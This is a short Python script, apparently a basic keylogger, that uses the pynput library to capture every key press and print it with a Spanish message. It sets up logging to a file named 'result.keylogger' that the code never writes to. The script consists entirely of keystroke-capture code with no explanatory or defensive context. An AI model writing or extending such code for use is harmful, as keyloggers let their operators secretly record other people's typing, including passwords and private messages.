
from pynput.keyboard import Listener
import logging

logging.basicConfig(filename='result.keylogger', level = logging.DEBUG,  format=(""))

def keystroke(key):

    print('Se ha pulsado la tecla: {0}'.format(key))

with Listener(on_press=keystroke) as input_keyboard:
    input_keyboard.join()